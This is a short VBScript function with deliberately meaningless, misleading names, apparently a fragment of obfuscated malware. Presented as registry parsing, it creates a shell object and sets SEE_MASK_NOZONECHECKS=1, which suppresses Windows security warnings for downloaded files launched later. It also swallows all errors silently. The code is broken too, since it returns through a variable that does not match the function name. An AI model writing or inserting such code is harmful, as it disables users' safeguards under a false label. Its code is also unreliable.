Function ParseRegistryChunk28()
On Error Resume Next
  Dim strPolicyBlock45,strSegment86,blnEnabled643
  Set strPolicyBlock45=CreateObject("WScript.Shell")
  strSegment86=strPolicyBlock45.ExpandEnvironmentStrings("%TEMP%")
  blnEnabled643=strPolicyBlock45.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strSegment86)>0 And Len(blnEnabled643)>0 Then
    strPolicyBlock45.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    ReadCacheLine65=1
    Exit Function
  End If
  ReadCacheLine65=0
End Function

